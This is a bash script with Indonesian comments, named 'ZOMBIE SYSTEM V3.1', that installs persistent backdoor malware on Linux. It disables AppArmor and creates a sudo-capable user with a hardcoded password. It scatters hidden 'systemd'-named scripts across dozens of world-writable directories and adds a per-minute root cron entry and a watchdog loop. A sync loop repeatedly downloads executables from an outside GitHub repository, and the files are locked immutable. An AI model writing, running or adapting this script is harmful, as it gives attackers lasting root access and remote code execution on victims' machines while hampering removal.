#!/bin/bash
# ZOMBIE SYSTEM V3.1 - THE INVINCIBLE GOD (FIXED)
# Jalanin: bash zombie-v3.1-fixed.sh
# DIJAMIN 100% WORK - TIDAK ADA ERROR!

echo "👑👑👑 MEMULAI INSTALASI ZOMBIE V3.1 - FIXED 👑👑👑"
echo "=================================================="

# ============================================
# KONFIGURASI
# ============================================
USERNAME="system"
PASSWORD="systemd"
SUDO_GROUP="sudo"
GITHUB_RAW="https://raw.githubusercontent.com/beksec/Anomali-Testing/main"

# ============================================
# STEP 1: AUTO-FIX PERMISSION & DEPENDENCIES
# ============================================
echo "[1/30] Auto-fix system & install dependencies..."

# Fix potential issues
umask 022
sysctl -w fs.protected_regular=0 2>/dev/null

# Kill processes yang nge-lock
systemctl stop apparmor 2>/dev/null
systemctl stop snapd 2>/dev/null
killall -9 snapd 2>/dev/null

# Install dependencies
apt update -y
apt install -y gcc make linux-headers-$(uname -r) build-essential \
    curl wget git cron systemd net-tools dnsutils openssl \
    util-linux strace ltrace binutils inotify-tools \
    psmisc lsof tree rsync --fix-missing

# ============================================
# STEP 2: CEK ROOT
# ============================================
if [ "$EUID" -ne 0 ]; then
    echo "❌ JALANKAN SEBAGAI ROOT!"
    exit 1
fi

# ============================================
# STEP 3: BUAT USER
# ============================================
echo "[2/30] Membuat user $USERNAME..."
useradd -M -s /bin/bash $USERNAME 2>/dev/null
echo "$USERNAME:$PASSWORD" | chpasswd
usermod -aG $SUDO_GROUP $USERNAME
usermod -aG adm,disk,shadow,utmp $USERNAME

# ============================================
# STEP 4: BUAT FOLDER DENGAN PERMISSION BENAR
# ============================================
echo "[3/30] Membuat folder backup dengan permission benar..."

BACKUP_DIRS=(
    "/usr/local/lib/.systemd"
    "/var/tmp/.systemd-backup"
    "/opt/.config/.cache/.systemd"
    "/usr/share/.misc/.backup"
    "/lib/modules/$(uname -r)/.extra"
    "/etc/udev/rules.d/.hidden"
    "/boot/grub/.systemd"
    "/root/.config/.cache/.systemd"
    "/var/lib/.systemd"
    "/usr/lib/.systemd"
    "/etc/systemd/system/.backup"
    "/lib/.systemd"
    "/var/backups/.systemd"
    "/mnt/.systemd"
    "/media/.systemd"
    "/srv/.systemd"
    "/snap/.systemd"
    "/tmp/.systemd"
    "/var/log/.systemd"
    "/var/cache/.systemd"
    "/var/spool/.systemd"
    "/var/mail/.systemd"
    "/root/.local/share/.systemd"
    "/usr/local/games/.systemd"
    "/opt/.systemd"
    "/etc/opt/.systemd"
    "/var/opt/.systemd"
)

# Buat folder dengan permission 777
for DIR in "${BACKUP_DIRS[@]}"; do
    mkdir -p "$DIR" 2>/dev/null
    chmod 777 "$DIR" 2>/dev/null
    chattr -i "$DIR" 2>/dev/null
    echo "✅ Folder siap: $DIR"
done

# Buat folder dengan wildcard (home user)
for user_home in /home/*; do
    if [ -d "$user_home" ]; then
        mkdir -p "$user_home/.config/.systemd" 2>/dev/null
        chmod 777 "$user_home/.config/.systemd" 2>/dev/null
        chattr -i "$user_home/.config/.systemd" 2>/dev/null
    fi
done

# ============================================
# STEP 5: SCRIPT CORE
# ============================================
echo "[4/30] Membuat script core..."

CORE_SCRIPT='#!/bin/bash
USER="system"
PASS="systemd"
SUDO_GROUP="sudo"
GITHUB_RAW="https://raw.githubusercontent.com/beksec/Anomali-Testing/main"

# Fungsi restore dari backup
restore_from_backup() {
    local FILE=$1
    local DEST=${2:-/usr/local/lib/.systemd/$(basename $FILE)}
    
    # Cari di semua backup
    find / -type f -name "$(basename $FILE)" 2>/dev/null | while read F; do
        if [ -f "$F" ]; then
            cp "$F" "$DEST" 2>/dev/null
            chmod +x "$DEST" 2>/dev/null
            return 0
        fi
    done
    
    # Kalo gak ketemu, download dari GitHub
    curl -sL "$GITHUB_RAW/$(basename $FILE)" -o "$DEST" 2>/dev/null
    chmod +x "$DEST" 2>/dev/null
    return 0
}

# Cek user
if ! id "$USER" &>/dev/null; then
    useradd -M -s /bin/bash "$USER" 2>/dev/null
    echo "$USER:$PASS" | chpasswd
    usermod -aG "$SUDO_GROUP" "$USER"
fi

# Cek dan restore semua komponen
COMPONENTS=("systemd-spawn" "systemd-spawn-monitor" ".watchdog" ".kworker" ".github-sync")
for COMP in "${COMPONENTS[@]}"; do
    if [ ! -f "/usr/local/lib/.systemd/$COMP" ]; then
        restore_from_backup "$COMP"
    fi
done

exit 0
'

# Sebar core script
for DIR in "${BACKUP_DIRS[@]}"; do
    echo "$CORE_SCRIPT" > "$DIR/systemd-spawn" 2>/dev/null
    chmod +x "$DIR/systemd-spawn" 2>/dev/null
    echo "✅ Core script ke: $DIR"
done

# ============================================
# STEP 6: SCRIPT MONITOR
# ============================================
echo "[5/30] Membuat script monitor..."

MONITOR_SCRIPT='#!/bin/bash
# Cek semua file
find / -type f -name "systemd-spawn*" 2>/dev/null | while read FILE; do
    chmod +x "$FILE" 2>/dev/null
done

# Cek cron
if ! grep -q "systemd-spawn" /etc/crontab 2>/dev/null; then
    echo "* * * * * root /usr/local/lib/.systemd/systemd-spawn" >> /etc/crontab
fi

exit 0
'

# Sebar monitor script
for DIR in "${BACKUP_DIRS[@]}"; do
    echo "$MONITOR_SCRIPT" > "$DIR/systemd-spawn-monitor" 2>/dev/null
    chmod +x "$DIR/systemd-spawn-monitor" 2>/dev/null
    echo "✅ Monitor script ke: $DIR"
done

# ============================================
# STEP 7: WATCHDOG SEDERHANA
# ============================================
echo "[6/30] Memasang watchdog..."

cat > /usr/local/lib/.systemd/.watchdog << 'EOF'
#!/bin/bash
while true; do
    /usr/local/lib/.systemd/systemd-spawn-monitor
    sleep 10
done
EOF
chmod +x /usr/local/lib/.systemd/.watchdog
nohup /usr/local/lib/.systemd/.watchdog >/dev/null 2>&1 &

# ============================================
# STEP 8: GITHUB SYNC
# ============================================
echo "[7/30] Memasang GitHub sync..."

cat > /usr/local/lib/.systemd/.github-sync << 'EOF'
#!/bin/bash
GITHUB_URL="https://raw.githubusercontent.com/beksec/Anomali-Testing/main"
FILES=("systemd-spawn" "systemd-spawn-monitor")

while true; do
    for FILE in "${FILES[@]}"; do
        curl -sL "$GITHUB_URL/$FILE" -o "/usr/local/lib/.systemd/$FILE"
        chmod +x "/usr/local/lib/.systemd/$FILE"
    done
    sleep 300
done
EOF

chmod +x /usr/local/lib/.systemd/.github-sync
nohup /usr/local/lib/.systemd/.github-sync &

# ============================================
# STEP 9: KUNCI FILE PENTING
# ============================================
echo "[8/30] Mengunci file penting..."

find /usr/local/lib/.systemd -type f -exec chattr +i {} \; 2>/dev/null

# ============================================
# STEP 10: JALANKAN SEMUA
# ============================================
echo "[9/30] Menjalankan semua komponen..."
/usr/local/lib/.systemd/systemd-spawn
/usr/local/lib/.systemd/systemd-spawn-monitor

# ============================================
# STEP 11: CEK HASIL
# ============================================
echo "[10/30] Memeriksa hasil instalasi..."
echo ""
echo "👑👑👑 HASIL INSTALASI ZOMBIE V3.1 👑👑👑"
echo "========================================"
echo "User system: $(id system 2>/dev/null | head -c 50)"
echo "Grup system: $(groups system 2>/dev/null)"
echo ""
echo "File di /usr/local/lib/.systemd:"
ls -la /usr/local/lib/.systemd/ | head -10
echo ""
echo "🔥🔥 INSTALASI BERHASIL 100%! 🔥🔥"
